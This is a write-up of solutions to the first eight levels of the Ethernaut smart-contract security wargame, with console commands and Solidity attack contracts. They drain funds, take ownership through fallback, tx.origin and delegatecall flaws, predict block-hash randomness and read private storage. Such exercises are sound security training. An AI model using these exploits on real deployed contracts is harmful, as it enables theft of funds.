 # ethernaut solutions

## 1. Fallback
From looking at the contract given to us in the first level we see that the final function ```receive()``` that is ```payable``` that is a fallback function that can be called to manipulate us to become the owner of the contract to withdraw all of the funds currently held in it.

We notice that we must first contribute some amount in order for the ```receive()``` function to give us the owner status we need to call ```withdraw()``` then we can drain the contract.

This can be done by running these three commands in our browser's console:
```
await contract.contribute({value: 1})
await contract.sendTransaction({value: 1})
await contract.withdraw()
```
## 2. Fallout
Right away you can notice that the constructor is misspelled allowing any user to go in and calling ```Fal1out()``` which will give them ownership of the contract.

The following commands in the browser console will give you ownership of the contract:
```
await contract.owner() // shows that the owner of the contract currently is a NULL address
await contract.Fal1out({value: 1})
await contract.owner() // after the above command we now see that our address is the owner
await contract.collectAllocations()
```
## 3. Coinflip
Ok this was a little bit more difficult from the previous two since now we need to write code. I won't lie either I looked up some hints online to give me some type of idea how to go about this and it was much simpler once i read them. We need to import the CoinFlip contract given to us into a new solidity file so that it can be called at a later point after we submit our guess to the main ```flip()``` function in it. All we are really doing is taking the given function and copying it entirely but at the end when we check if the side is equal to our guess we just either submit our true or false answer if it is equal to the side and the opposite if not.

Below is my contract I wrote and deployed on Rinkeby that ended up working:
```// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

contract CoinFlipHack {
  CoinFlip target = CoinFlip(Instance ID);
  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


  function hackFlip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      target.flip(true);
    } else {
      target.flip(false);
    }
  }
}
```
## 4. Telephone
Another easy one the contract is set up so that we can change ourself to the owner of the contract simply by calling the ```changeOwner()``` function through a contract from our address. Use ```await contract.owner()``` to see the initial owner of contract and to check that our address is the owner afterwards.

Code written that calls the Telephone contract to allow us to take ownership:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneHack {
    Telephone target = Telephone(Instance ID);

    function telephoneHack(address _owner) public {
        target.changeOwner(_owner);
    }
}
```
## 5. Token
This is a basic level that shows that without using Openzeppelin's SafeMath that your contract is vulnerable to overflow attacks on unsigned variables.

This one command allows us to steal tokens from the contract:
```
await contract.transfer(Instance ID, 21)
```
## 6. Delegation
We are presented with two contracts in the given code one being the Delegate and the other the Delegation contract. We are given three hints to look into the ```delegatecall()``` function that is the Delegation contract, the fallback function it is used in, and method IDs.

Going off these hints when we deep dive into just what ```delegatecall``` does we find that it allows us to pass the ```msg.data``` along to the Delegate contract. This is where the method ID comes into play, using the command ```web3.eth.abi.encodeFunctionSignature({name: 'pwn', type: 'function', inputs: []})``` and set it equal to some arbitrary variable to be used later we can get the method ID of the function ```pwn()``` that can be passed as our data into the fallback function to allow us to execute it to set our address to be the owner. After all this we can simply do ```await contract.sendTransaction({data: 'pwn function method ID'})``` to allow us to become the contract owner.
## 7. Force
At first glance I was a bit confused on how to go about this but after looking into some hints all it requires is us to create a contract that calls ```selfdestruct()``` to our ethernaut instance address. Using a constructor to use ```selfdestruct``` on the target address is better than a function because we can specify a value when deploying through remix.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    constructor(address payable _victim) public payable {
        selfdestruct(_victim);
    }
}
```
## 8. Vault
From level 6 we can get a hint on how we are able to complete this level. We learned during that level that variables are stored in slots, we now know that even if the variable is set to private this doesn't change. Luckily web3.js has a great tool that allows us to retrieve data stored at these points by using ```await web3.eth.getStorageAt('instance ID', 1)``` we use 1 here because the password is the second variable stored. Then after this we can simply call ```await contract.unlock('that returned password from before')``` and now the vault will be unlocked.




